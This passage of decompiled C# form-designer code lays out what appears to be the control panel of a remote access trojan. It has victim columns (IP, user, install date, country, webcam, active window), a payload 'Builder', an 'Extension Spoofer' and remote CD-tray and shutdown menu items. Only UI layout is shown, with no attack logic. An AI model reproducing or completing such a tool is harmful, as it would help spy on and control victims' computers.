			arg_4A2E_0.Size = size;
			this.RefreshToolStripMenuItem1.Text = "Refresh";
			this.ToolStripMenuItem30.BackColor = Color.Black;
			this.ToolStripMenuItem30.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem30.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem30.Image");
			this.ToolStripMenuItem30.Name = "ToolStripMenuItem30";
			ToolStripItem arg_4AAC_0 = this.ToolStripMenuItem30;
			size = new Size(136, 22);
			arg_4AAC_0.Size = size;
			this.ToolStripMenuItem30.Text = "Shut Down";
			this.CDPlayerToolStripMenuItem1.BackColor = Color.Black;
			this.CDPlayerToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.OpenCDToolStripMenuItem1,
				this.GGGToolStripMenuItem,
				this.GGToolStripMenuItem
			});
			this.CDPlayerToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.CDPlayerToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("CDPlayerToolStripMenuItem1.Image");
			this.CDPlayerToolStripMenuItem1.Name = "CDPlayerToolStripMenuItem1";
			ToolStripItem arg_4B66_0 = this.CDPlayerToolStripMenuItem1;
			size = new Size(136, 22);
			arg_4B66_0.Size = size;
			this.CDPlayerToolStripMenuItem1.Text = "CD Player";
			this.OpenCDToolStripMenuItem1.BackColor = Color.Black;
			this.OpenCDToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.OpenCDToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("OpenCDToolStripMenuItem1.Image");
			this.OpenCDToolStripMenuItem1.Name = "OpenCDToolStripMenuItem1";
			ToolStripItem arg_4BE1_0 = this.OpenCDToolStripMenuItem1;
			size = new Size(123, 22);
			arg_4BE1_0.Size = size;
			this.OpenCDToolStripMenuItem1.Text = "Open CD";
			this.GGGToolStripMenuItem.BackColor = Color.Black;
			this.GGGToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.GGGToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("GGGToolStripMenuItem.Image");
			this.GGGToolStripMenuItem.Name = "GGGToolStripMenuItem";
			ToolStripItem arg_4C5C_0 = this.GGGToolStripMenuItem;
			size = new Size(123, 22);
			arg_4C5C_0.Size = size;
			this.GGGToolStripMenuItem.Text = "Hide ";
			this.GGToolStripMenuItem.BackColor = Color.Black;
			this.GGToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.GGToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("GGToolStripMenuItem.Image");
			this.GGToolStripMenuItem.Name = "GGToolStripMenuItem";
			ToolStripItem arg_4CD7_0 = this.GGToolStripMenuItem;
			size = new Size(123, 22);
			arg_4CD7_0.Size = size;
			this.GGToolStripMenuItem.Text = "Show ";
			this.IndexFileToolStripMenuItem1.BackColor = Color.Black;
			this.IndexFileToolStripMenuItem1.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.IndexFileToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.IndexFileToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("IndexFileToolStripMenuItem1.Image");
			this.IndexFileToolStripMenuItem1.Name = "IndexFileToolStripMenuItem1";
			ToolStripItem arg_4D73_0 = this.IndexFileToolStripMenuItem1;
			size = new Size(166, 22);
			arg_4D73_0.Size = size;
			this.IndexFileToolStripMenuItem1.Text = "Index File";
			this.ColumnHeader2.DisplayIndex = 0;
			this.ColumnHeader2.Text = "User +Install Date";
			this.ColumnHeader2.Width = 109;
			this.ColumnHeader3.DisplayIndex = 1;
			this.ColumnHeader3.Text = "Country";
			this.ColumnHeader3.Width = 58;
			this.ColumnHeader4.DisplayIndex = 2;
			this.ColumnHeader4.Text = "CR";
			this.ColumnHeader4.Width = 56;
			this.ColumnHeader5.DisplayIndex = 3;
			this.ColumnHeader5.Text = "Name";
			this.ColumnHeader5.Width = 57;
			this.ColumnHeader6.DisplayIndex = 4;
			this.ColumnHeader6.Text = "FLag   ";
			this.ColumnHeader7.Text = "OS Computer";
			this.ColumnHeader7.Width = 79;
			this.ColumnHeader8.Text = "Cam";
			this.ColumnHeader8.Width = 84;
			this.ColumnHeader9.Text = "Ver";
			this.ColumnHeader9.Width = 77;
			this.ColumnHeader10.Text = "Ping        ";
			this.ColumnHeader10.Width = 80;
			this.ColumnHeader11.Text = "Active Window    ";
			this.ColumnHeader11.Width = 93;
			this.ColumnHeader21.Text = "                                     ";
			this.ColumnHeader21.Width = 66;
			this.ColumnHeader22.Text = "                                        ";
			this.ColumnHeader23.Text = "                                          ";
			this.ColumnHeader24.Text = "                                                 ";
			this.Panel3.Controls.Add(this.NyX_GroupBox1);
			this.Panel3.Controls.Add(this.TextBox3);
			this.Panel3.Controls.Add(this.L1V);
			this.Panel3.Dock = DockStyle.Fill;
			Control arg_4FA9_0 = this.Panel3;
			location = new Point(0, 0);
			arg_4FA9_0.Location = location;
			this.Panel3.Name = "Panel3";
			Control arg_4FDA_0 = this.Panel3;
			size = new Size(860, 334);
			arg_4FDA_0.Size = size;
			this.Panel3.TabIndex = 19;
			this.NyX_GroupBox1.Animated = true;
			this.NyX_GroupBox1.BorderStyle = FormBorderStyle.None;
			this.NyX_GroupBox1.Colors = new Bloom[0];
			this.NyX_GroupBox1.Customization = "";
			this.NyX_GroupBox1.Font = new Font("Arial", 9f);
			this.NyX_GroupBox1.Image = null;
			Control arg_506D_0 = this.NyX_GroupBox1;
			location = new Point(-377, 155);
			arg_506D_0.Location = location;
			this.NyX_GroupBox1.Movable = true;
			this.NyX_GroupBox1.Name = "NyX_GroupBox1";
			this.NyX_GroupBox1.NoRounding = false;
			this.NyX_GroupBox1.Sizable = true;
			Control arg_50C2_0 = this.NyX_GroupBox1;
			size = new Size(165, 24);
			arg_50C2_0.Size = size;
			this.NyX_GroupBox1.SmartBounds = true;
			this.NyX_GroupBox1.StartPosition = FormStartPosition.Manual;
			this.NyX_GroupBox1.TabIndex = 119;
			this.NyX_GroupBox1.Text = ".";
			this.NyX_GroupBox1.TransparencyKey = Color.Empty;
			this.NyX_GroupBox1.Transparent = false;
			this.TextBox3.BackColor = Color.Black;
			this.TextBox3.BorderStyle = BorderStyle.FixedSingle;
			this.TextBox3.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.TextBox3.ForeColor = Color.Black;
			Control arg_517F_0 = this.TextBox3;
			location = new Point(0, 25);
			arg_517F_0.Location = location;
			Control arg_5199_0 = this.TextBox3;
			padding = new Padding(2, 3, 2, 3);
			arg_5199_0.Margin = padding;
			this.TextBox3.Multiline = true;
			this.TextBox3.Name = "TextBox3";
			Control arg_51D3_0 = this.TextBox3;
			size = new Size(1799, 2);
			arg_51D3_0.Size = size;
			this.TextBox3.TabIndex = 12;
			this.TextBox3.Text = "\r\n";
			this.L1V.BackColor = Color.Black;
			this.L1V.Columns.AddRange(new ColumnHeader[]
			{
				this.ColumnHeader14,
				this.ColumnHeader15,
				this.ColumnHeader16,
				this.ColumnHeader17,
				this.ColumnHeader18,
				this.ColumnHeader19,
				this.ColumnHeader20,
				this.ColumnHeader25,
				this.ColumnHeader26,
				this.ColumnHeader27,
				this.ColumnHeader28,
				this.ColumnHeader29,
				this.ColumnHeader30,
				this.ColumnHeader31,
				this.ColumnHeader32,
				this.ColumnHeader33,
				this.ColumnHeader34,
				this.ColumnHeader35,
				this.ColumnHeader36,
				this.ColumnHeader37
			});
			this.L1V.ContextMenuStrip = this.ContextMenuStrip3;
			this.L1V.Dock = DockStyle.Fill;
			this.L1V.Font = new Font("Arial", 8f, FontStyle.Bold);
			this.L1V.ForeColor = Color.LightSteelBlue;
			this.L1V.FullRowSelect = true;
			this.L1V.LargeImageList = this.IMG2;
			Control arg_5389_0 = this.L1V;
			location = new Point(0, 0);
			arg_5389_0.Location = location;
			this.L1V.Name = "L1V";
			this.L1V.OwnerDraw = true;
			Control arg_53C7_0 = this.L1V;
			size = new Size(860, 334);
			arg_53C7_0.Size = size;
			this.L1V.SmallImageList = this.IMG2;
			this.L1V.TabIndex = 16;
			this.L1V.UseCompatibleStateImageBehavior = false;
			this.L1V.View = View.Details;
			this.ColumnHeader14.Text = "Name";
			this.ColumnHeader14.Width = 66;
			this.ColumnHeader15.Text = "IP";
			this.ColumnHeader15.Width = 68;
			this.ColumnHeader16.Text = "PC";
			this.ColumnHeader16.Width = 65;
			this.ColumnHeader17.Text = "User";
			this.ColumnHeader17.Width = 66;
			this.ColumnHeader18.Text = "Install Date";
			this.ColumnHeader18.Width = 65;
			this.ColumnHeader19.Text = "Country";
			this.ColumnHeader20.Text = "OS";
			this.ColumnHeader20.Width = 64;
			this.ColumnHeader25.Text = "Cam";
			this.ColumnHeader25.Width = 67;
			this.ColumnHeader26.Text = "Ver";
			this.ColumnHeader26.Width = 67;
			this.ColumnHeader27.Text = "Ping";
			this.ColumnHeader27.Width = 73;
			this.ColumnHeader28.Text = "Active Window";
			this.ColumnHeader28.Width = 119;
			this.ColumnHeader29.Text = "   ";
			this.ColumnHeader29.Width = 617;
			this.ColumnHeader30.Text = "";
			this.ColumnHeader30.Width = 554;
			this.ColumnHeader31.Text = "                                                                                                                                                                  ";
			this.ColumnHeader32.Text = "                                                                                                                                                                                ";
			this.ColumnHeader33.Text = "                                        ";
			this.ColumnHeader34.Text = "                                              ";
			this.ColumnHeader35.Text = "                                             ";
			this.ColumnHeader36.Text = "                                             ";
			this.ColumnHeader37.Text = "                                          ";
			this.IMG2.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("IMG2.ImageStream");
			this.IMG2.TransparentColor = Color.Transparent;
			this.IMG2.Images.SetKeyName(0, "X.png");
			this.IMG2.Images.SetKeyName(1, "b.png");
			this.IMG2.Images.SetKeyName(2, "ABW.png");
			this.IMG2.Images.SetKeyName(3, "AFG.png");
			this.IMG2.Images.SetKeyName(4, "AGO.png");
			this.IMG2.Images.SetKeyName(5, "AIA.png");
			this.IMG2.Images.SetKeyName(6, "ALA.png");
			this.IMG2.Images.SetKeyName(7, "ALB.png");
			this.IMG2.Images.SetKeyName(8, "AND.png");
			this.IMG2.Images.SetKeyName(9, "ARE.png");
			this.IMG2.Images.SetKeyName(10, "ARG.png");
			this.IMG2.Images.SetKeyName(11, "ARM.png");
			this.IMG2.Images.SetKeyName(12, "ASM.png");
			this.IMG2.Images.SetKeyName(13, "ATF.png");
			this.IMG2.Images.SetKeyName(14, "ATG.png");
			this.IMG2.Images.SetKeyName(15, "AUS.png");
			this.IMG2.Images.SetKeyName(16, "AUT.png");
			this.IMG2.Images.SetKeyName(17, "AZE.png");
			this.IMG2.Images.SetKeyName(18, "BDI.png");
			this.IMG2.Images.SetKeyName(19, "BEL.png");
			this.IMG2.Images.SetKeyName(20, "BEN.png");
			this.IMG2.Images.SetKeyName(21, "BFA.png");
			this.IMG2.Images.SetKeyName(22, "BGD.png");
			this.IMG2.Images.SetKeyName(23, "BGR.png");
			this.IMG2.Images.SetKeyName(24, "BHR.png");
			this.IMG2.Images.SetKeyName(25, "BHS.png");
			this.IMG2.Images.SetKeyName(26, "BIH.png");
			this.IMG2.Images.SetKeyName(27, "BLR.png");
			this.IMG2.Images.SetKeyName(28, "BLZ.png");
			this.IMG2.Images.SetKeyName(29, "BMU.png");
			this.IMG2.Images.SetKeyName(30, "BOL.png");
			this.IMG2.Images.SetKeyName(31, "BRA.png");
			this.IMG2.Images.SetKeyName(32, "BRB.png");
			this.IMG2.Images.SetKeyName(33, "BRN.png");
			this.IMG2.Images.SetKeyName(34, "BTN.png");
			this.IMG2.Images.SetKeyName(35, "BVT.png");
			this.IMG2.Images.SetKeyName(36, "BWA.png");
			this.IMG2.Images.SetKeyName(37, "CAF.png");
			this.IMG2.Images.SetKeyName(38, "CAN.png");
			this.IMG2.Images.SetKeyName(39, "CCK.png");
			this.IMG2.Images.SetKeyName(40, "CHE.png");
			this.IMG2.Images.SetKeyName(41, "CHL.png");
			this.IMG2.Images.SetKeyName(42, "CHN.png");
			this.IMG2.Images.SetKeyName(43, "CIV.png");
			this.IMG2.Images.SetKeyName(44, "CMR.png");
			this.IMG2.Images.SetKeyName(45, "COD.png");
			this.IMG2.Images.SetKeyName(46, "COG.png");
			this.IMG2.Images.SetKeyName(47, "COK.png");
			this.IMG2.Images.SetKeyName(48, "COL.png");
			this.IMG2.Images.SetKeyName(49, "COM.png");
			this.IMG2.Images.SetKeyName(50, "CPV.png");
			this.IMG2.Images.SetKeyName(51, "CRI.png");
			this.IMG2.Images.SetKeyName(52, "CUB.png");
			this.IMG2.Images.SetKeyName(53, "CXR.png");
			this.IMG2.Images.SetKeyName(54, "CYM.png");
			this.IMG2.Images.SetKeyName(55, "CYP.png");
			this.IMG2.Images.SetKeyName(56, "CZE.png");
			this.IMG2.Images.SetKeyName(57, "DEU.png");
			this.IMG2.Images.SetKeyName(58, "DJI.png");
			this.IMG2.Images.SetKeyName(59, "DMA.png");
			this.IMG2.Images.SetKeyName(60, "DNK.png");
			this.IMG2.Images.SetKeyName(61, "DOM.png");
			this.IMG2.Images.SetKeyName(62, "DZA.png");
			this.IMG2.Images.SetKeyName(63, "ECU.png");
			this.IMG2.Images.SetKeyName(64, "EGY.png");
			this.IMG2.Images.SetKeyName(65, "ERI.png");
			this.IMG2.Images.SetKeyName(66, "ESH.png");
			this.IMG2.Images.SetKeyName(67, "ESP.png");
			this.IMG2.Images.SetKeyName(68, "EST.png");
			this.IMG2.Images.SetKeyName(69, "ETH.png");
			this.IMG2.Images.SetKeyName(70, "FIN.png");
			this.IMG2.Images.SetKeyName(71, "FJI.png");
			this.IMG2.Images.SetKeyName(72, "FLK.png");
			this.IMG2.Images.SetKeyName(73, "FRA.png");
			this.IMG2.Images.SetKeyName(74, "FRO.png");
			this.IMG2.Images.SetKeyName(75, "FSM.png");
			this.IMG2.Images.SetKeyName(76, "GAB.png");
			this.IMG2.Images.SetKeyName(77, "GBR.png");
			this.IMG2.Images.SetKeyName(78, "GEO.png");
			this.IMG2.Images.SetKeyName(79, "GHA.png");
			this.IMG2.Images.SetKeyName(80, "GIB.png");
			this.IMG2.Images.SetKeyName(81, "GIN.png");
			this.IMG2.Images.SetKeyName(82, "GLP.png");
			this.IMG2.Images.SetKeyName(83, "GMB.png");
			this.IMG2.Images.SetKeyName(84, "GNB.png");
			this.IMG2.Images.SetKeyName(85, "GNQ.png");
			this.IMG2.Images.SetKeyName(86, "GRC.png");
			this.IMG2.Images.SetKeyName(87, "GRD.png");
			this.IMG2.Images.SetKeyName(88, "GRL.png");
			this.IMG2.Images.SetKeyName(89, "GTM.png");
			this.IMG2.Images.SetKeyName(90, "GUF.png");
			this.IMG2.Images.SetKeyName(91, "GUM.png");
			this.IMG2.Images.SetKeyName(92, "GUY.png");
			this.IMG2.Images.SetKeyName(93, "HKG.png");
			this.IMG2.Images.SetKeyName(94, "HMD.png");
			this.IMG2.Images.SetKeyName(95, "HND.png");
			this.IMG2.Images.SetKeyName(96, "HRV.png");
			this.IMG2.Images.SetKeyName(97, "HTI.png");
			this.IMG2.Images.SetKeyName(98, "HUN.png");
			this.IMG2.Images.SetKeyName(99, "IDN.png");
			this.IMG2.Images.SetKeyName(100, "IND.png");
			this.IMG2.Images.SetKeyName(101, "IOT.png");
			this.IMG2.Images.SetKeyName(102, "IRL.png");
			this.IMG2.Images.SetKeyName(103, "IRN.png");
			this.IMG2.Images.SetKeyName(104, "IRQ.png");
			this.IMG2.Images.SetKeyName(105, "ISL.png");
			this.IMG2.Images.SetKeyName(106, "ISR.png");
			this.IMG2.Images.SetKeyName(107, "ITA.png");
			this.IMG2.Images.SetKeyName(108, "JAM.png");
			this.IMG2.Images.SetKeyName(109, "JOR.png");
			this.IMG2.Images.SetKeyName(110, "JPN.png");
			this.IMG2.Images.SetKeyName(111, "KAZ.png");
			this.IMG2.Images.SetKeyName(112, "KEN.png");
			this.IMG2.Images.SetKeyName(113, "KGZ.png");
			this.IMG2.Images.SetKeyName(114, "KHM.png");
			this.IMG2.Images.SetKeyName(115, "KIR.png");
			this.IMG2.Images.SetKeyName(116, "KNA.png");
			this.IMG2.Images.SetKeyName(117, "KOR.png");
			this.IMG2.Images.SetKeyName(118, "KWT.png");
			this.IMG2.Images.SetKeyName(119, "LAO.png");
			this.IMG2.Images.SetKeyName(120, "LBN.png");
			this.IMG2.Images.SetKeyName(121, "LBR.png");
			this.IMG2.Images.SetKeyName(122, "LBY.png");
			this.IMG2.Images.SetKeyName(123, "LCA.png");
			this.IMG2.Images.SetKeyName(124, "LIE.png");
			this.IMG2.Images.SetKeyName(125, "LKA.png");
			this.IMG2.Images.SetKeyName(126, "LSO.png");
			this.IMG2.Images.SetKeyName(127, "LTU.png");
			this.IMG2.Images.SetKeyName(128, "LUX.png");
			this.IMG2.Images.SetKeyName(129, "LVA.png");
			this.IMG2.Images.SetKeyName(130, "MAC.png");
			this.IMG2.Images.SetKeyName(131, "MAR.png");
			this.IMG2.Images.SetKeyName(132, "MCO.png");
			this.IMG2.Images.SetKeyName(133, "MDA.png");
			this.IMG2.Images.SetKeyName(134, "MDG.png");
			this.IMG2.Images.SetKeyName(135, "MDV.png");
			this.IMG2.Images.SetKeyName(136, "MEX.png");
			this.IMG2.Images.SetKeyName(137, "MHL.png");
			this.IMG2.Images.SetKeyName(138, "MKD.png");
			this.IMG2.Images.SetKeyName(139, "MLI.png");
			this.IMG2.Images.SetKeyName(140, "MLT.png");
			this.IMG2.Images.SetKeyName(141, "MMR.png");
			this.IMG2.Images.SetKeyName(142, "MNE.png");
			this.IMG2.Images.SetKeyName(143, "MNG.png");
			this.IMG2.Images.SetKeyName(144, "MNP.png");
			this.IMG2.Images.SetKeyName(145, "MOZ.png");
			this.IMG2.Images.SetKeyName(146, "MRT.png");
			this.IMG2.Images.SetKeyName(147, "MSR.png");
			this.IMG2.Images.SetKeyName(148, "MTQ.png");
			this.IMG2.Images.SetKeyName(149, "MUS.png");
			this.IMG2.Images.SetKeyName(150, "MWI.png");
			this.IMG2.Images.SetKeyName(151, "MYS.png");
			this.IMG2.Images.SetKeyName(152, "MYT.png");
			this.IMG2.Images.SetKeyName(153, "NAM.png");
			this.IMG2.Images.SetKeyName(154, "NCL.png");
			this.IMG2.Images.SetKeyName(155, "NER.png");
			this.IMG2.Images.SetKeyName(156, "NFK.png");
			this.IMG2.Images.SetKeyName(157, "NGA.png");
			this.IMG2.Images.SetKeyName(158, "NIC.png");
			this.IMG2.Images.SetKeyName(159, "NIU.png");
			this.IMG2.Images.SetKeyName(160, "NLD.png");
			this.IMG2.Images.SetKeyName(161, "NOR.png");
			this.IMG2.Images.SetKeyName(162, "NPL.png");
			this.IMG2.Images.SetKeyName(163, "NRU.png");
			this.IMG2.Images.SetKeyName(164, "NZL.png");
			this.IMG2.Images.SetKeyName(165, "OMN.png");
			this.IMG2.Images.SetKeyName(166, "PAK.png");
			this.IMG2.Images.SetKeyName(167, "PAN.png");
			this.IMG2.Images.SetKeyName(168, "PCN.png");
			this.IMG2.Images.SetKeyName(169, "PER.png");
			this.IMG2.Images.SetKeyName(170, "PHL.png");
			this.IMG2.Images.SetKeyName(171, "PLW.png");
			this.IMG2.Images.SetKeyName(172, "PNG.png");
			this.IMG2.Images.SetKeyName(173, "POL.png");
			this.IMG2.Images.SetKeyName(174, "PRI.png");
			this.IMG2.Images.SetKeyName(175, "PRK.png");
			this.IMG2.Images.SetKeyName(176, "PRT.png");
			this.IMG2.Images.SetKeyName(177, "PRY.png");
			this.IMG2.Images.SetKeyName(178, "PSE.png");
			this.IMG2.Images.SetKeyName(179, "PYF.png");
			this.IMG2.Images.SetKeyName(180, "QAT.png");
			this.IMG2.Images.SetKeyName(181, "REU.png");
			this.IMG2.Images.SetKeyName(182, "ROM.png");
			this.IMG2.Images.SetKeyName(183, "RUS.png");
			this.IMG2.Images.SetKeyName(184, "RWA.png");
			this.IMG2.Images.SetKeyName(185, "SAU.png");
			this.IMG2.Images.SetKeyName(186, "SDN.png");
			this.IMG2.Images.SetKeyName(187, "SEN.png");
			this.IMG2.Images.SetKeyName(188, "SGP.png");
			this.IMG2.Images.SetKeyName(189, "SGS.png");
			this.IMG2.Images.SetKeyName(190, "SHN.png");
			this.IMG2.Images.SetKeyName(191, "SJM.png");
			this.IMG2.Images.SetKeyName(192, "SLB.png");
			this.IMG2.Images.SetKeyName(193, "SLE.png");
			this.IMG2.Images.SetKeyName(194, "SLV.png");
			this.IMG2.Images.SetKeyName(195, "SMR.png");
			this.IMG2.Images.SetKeyName(196, "SOM.png");
			this.IMG2.Images.SetKeyName(197, "SPM.png");
			this.IMG2.Images.SetKeyName(198, "SRB.png");
			this.IMG2.Images.SetKeyName(199, "STP.png");
			this.IMG2.Images.SetKeyName(200, "SUR.png");
			this.IMG2.Images.SetKeyName(201, "SVK.png");
			this.IMG2.Images.SetKeyName(202, "SVN.png");
			this.IMG2.Images.SetKeyName(203, "SWE.png");
			this.IMG2.Images.SetKeyName(204, "SWZ.png");
			this.IMG2.Images.SetKeyName(205, "SYC.png");
			this.IMG2.Images.SetKeyName(206, "SYR.png");
			this.IMG2.Images.SetKeyName(207, "TCA.png");
			this.IMG2.Images.SetKeyName(208, "TCD.png");
			this.IMG2.Images.SetKeyName(209, "TGO.png");
			this.IMG2.Images.SetKeyName(210, "THA.png");
			this.IMG2.Images.SetKeyName(211, "TJK.png");
			this.IMG2.Images.SetKeyName(212, "TKL.png");
			this.IMG2.Images.SetKeyName(213, "TKM.png");
			this.IMG2.Images.SetKeyName(214, "TLS.png");
			this.IMG2.Images.SetKeyName(215, "TON.png");
			this.IMG2.Images.SetKeyName(216, "TTO.png");
			this.IMG2.Images.SetKeyName(217, "TUN.png");
			this.IMG2.Images.SetKeyName(218, "TUR.png");
			this.IMG2.Images.SetKeyName(219, "TUV.png");
			this.IMG2.Images.SetKeyName(220, "TWN.png");
			this.IMG2.Images.SetKeyName(221, "TZA.png");
			this.IMG2.Images.SetKeyName(222, "UGA.png");
			this.IMG2.Images.SetKeyName(223, "UKR.png");
			this.IMG2.Images.SetKeyName(224, "UMI.png");
			this.IMG2.Images.SetKeyName(225, "URY.png");
			this.IMG2.Images.SetKeyName(226, "USA.png");
			this.IMG2.Images.SetKeyName(227, "UZB.png");
			this.IMG2.Images.SetKeyName(228, "VAT.png");
			this.IMG2.Images.SetKeyName(229, "VCT.png");
			this.IMG2.Images.SetKeyName(230, "VEN.png");
			this.IMG2.Images.SetKeyName(231, "VGB.png");
			this.IMG2.Images.SetKeyName(232, "VIR.png");
			this.IMG2.Images.SetKeyName(233, "VNM.png");
			this.IMG2.Images.SetKeyName(234, "VUT.png");
			this.IMG2.Images.SetKeyName(235, "WLF.png");
			this.IMG2.Images.SetKeyName(236, "WSM.png");
			this.IMG2.Images.SetKeyName(237, "YEM.png");
			this.IMG2.Images.SetKeyName(238, "ZAF.png");
			this.IMG2.Images.SetKeyName(239, "ZMB.png");
			this.IMG2.Images.SetKeyName(240, "ZWE.png");
			this.StatusStrip1.BackColor = Color.Black;
			this.StatusStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.ToStael1,
				this.ToolStripStatusLabel3,
				this.ToolStripStatusLabel5,
				this.ToolStripStatusLabel4,
				this.conz,
				this.upl,
				this.dwn,
				this.To2,
				this.Tool1,
				this.ToolStripStatusLabel2,
				this.ToolStripStatusLabel6,
				this.Tou,
				this.ToolStripStatusLabel8
			});
			Control arg_6EEF_0 = this.StatusStrip1;
			location = new Point(0, 312);
			arg_6EEF_0.Location = location;
			this.StatusStrip1.Name = "StatusStrip1";
			this.StatusStrip1.RenderMode = ToolStripRenderMode.Professional;
			Control arg_6F2A_0 = this.StatusStrip1;
			size = new Size(860, 22);
			arg_6F2A_0.Size = size;
			this.StatusStrip1.SizingGrip = false;
			this.StatusStrip1.TabIndex = 20;
			this.StatusStrip1.Tag = "1";
			this.StatusStrip1.Text = "StatusStrip1";
			this.ToStael1.ActiveLinkColor = Color.Lime;
			this.ToStael1.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToStael1.ForeColor = Color.White;
			this.ToStael1.IsLink = true;
			this.ToStael1.LinkColor = Color.White;
			this.ToStael1.Name = "ToStael1";
			ToolStripItem arg_6FF0_0 = this.ToStael1;
			size = new Size(49, 17);
			arg_6FF0_0.Size = size;
			this.ToStael1.Tag = "1";
			this.ToStael1.Text = "[ Logs ]";
			this.ToolStripStatusLabel3.ActiveLinkColor = Color.Lime;
			this.ToolStripStatusLabel3.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripStatusLabel3.ForeColor = Color.White;
			this.ToolStripStatusLabel3.IsLink = true;
			this.ToolStripStatusLabel3.LinkColor = Color.White;
			this.ToolStripStatusLabel3.Name = "ToolStripStatusLabel3";
			ToolStripItem arg_709B_0 = this.ToolStripStatusLabel3;
			size = new Size(60, 17);
			arg_709B_0.Size = size;
			this.ToolStripStatusLabel3.Text = "[ Builder ]";
			this.ToolStripStatusLabel5.ActiveLinkColor = Color.Lime;
			this.ToolStripStatusLabel5.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripStatusLabel5.ForeColor = Color.White;
			this.ToolStripStatusLabel5.IsLink = true;
			this.ToolStripStatusLabel5.LinkColor = Color.White;
			this.ToolStripStatusLabel5.Name = "ToolStripStatusLabel5";
			ToolStripItem arg_7135_0 = this.ToolStripStatusLabel5;
			size = new Size(67, 17);
			arg_7135_0.Size = size;
			this.ToolStripStatusLabel5.Text = "[ Settings ]";
			this.ToolStripStatusLabel4.ActiveLinkColor = Color.Lime;
			this.ToolStripStatusLabel4.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripStatusLabel4.ForeColor = Color.White;
			this.ToolStripStatusLabel4.IsLink = true;
			this.ToolStripStatusLabel4.LinkColor = Color.White;
			this.ToolStripStatusLabel4.Name = "ToolStripStatusLabel4";
			ToolStripItem arg_71CF_0 = this.ToolStripStatusLabel4;
			size = new Size(54, 17);
			arg_71CF_0.Size = size;
			this.ToolStripStatusLabel4.Text = "[ About ]";
			this.conz.ActiveLinkColor = Color.FromArgb(0, 192, 0);
			this.conz.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.conz.ForeColor = Color.LightSteelBlue;
			this.conz.IsLink = true;
			this.conz.LinkColor = Color.White;
			this.conz.Name = "conz";
			ToolStripItem arg_7270_0 = this.conz;
			size = new Size(108, 17);
			arg_7270_0.Size = size;
			this.conz.Text = "Extension Spoofer";
			this.upl.ActiveLinkColor = Color.FromArgb(0, 192, 0);
			this.upl.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.upl.ForeColor = Color.LightSteelBlue;
			this.upl.IsLink = true;
			this.upl.LinkColor = Color.White;
			this.upl.Name = "upl";
			ToolStripItem arg_7311_0 = this.upl;
			size = new Size(68, 17);
			arg_7311_0.Size = size;
			this.upl.Text = "File Builder";
			this.dwn.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.dwn.ForeColor = Color.LightSteelBlue;
			this.dwn.Name = "dwn";
			ToolStripItem arg_737B_0 = this.dwn;
			size = new Size(0, 17);
			arg_737B_0.Size = size;
			this.To2.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.To2.ForeColor = Color.LightSteelBlue;
			this.To2.Name = "To2";
			ToolStripItem arg_73D5_0 = this.To2;
			size = new Size(105, 17);
			arg_73D5_0.Size = size;
			this.To2.Text = "Download [Bytes]";
			this.Tool1.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Tool1.ForeColor = Color.LightSteelBlue;
			this.Tool1.Name = "Tool1";
			ToolStripItem arg_7440_0 = this.Tool1;
			size = new Size(17, 17);
			arg_7440_0.Size = size;
			this.Tool1.Text = " 1";
			this.ToolStripStatusLabel2.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripStatusLabel2.ForeColor = Color.LightSteelBlue;
			this.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2";
			ToolStripItem arg_74AB_0 = this.ToolStripStatusLabel2;
			size = new Size(11, 17);
			arg_74AB_0.Size = size;
			this.ToolStripStatusLabel2.Text = "]";
			this.ToolStripStatusLabel6.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripStatusLabel6.ForeColor = Color.LightSteelBlue;
			this.ToolStripStatusLabel6.Name = "ToolStripStatusLabel6";
			ToolStripItem arg_7516_0 = this.ToolStripStatusLabel6;
			size = new Size(85, 17);
			arg_7516_0.Size = size;
			this.ToolStripStatusLabel6.Text = "Upload[Bytes]";
			this.Tou.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Tou.ForeColor = Color.LightSteelBlue;
			this.Tou.Name = "Tou";
			ToolStripItem arg_7581_0 = this.Tou;
			size = new Size(14, 17);
			arg_7581_0.Size = size;
			this.Tou.Text = "1";
			this.ToolStripStatusLabel8.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripStatusLabel8.ForeColor = Color.LightSteelBlue;
			this.ToolStripStatusLabel8.Name = "ToolStripStatusLabel8";
			ToolStripItem arg_75EC_0 = this.ToolStripStatusLabel8;
			size = new Size(11, 17);
			arg_75EC_0.Size = size;
			this.ToolStripStatusLabel8.Text = "]";
			this.Timer4.Enabled = true;
			this.Timer5.Enabled = true;
			this.L2.BackColor = Color.Black;
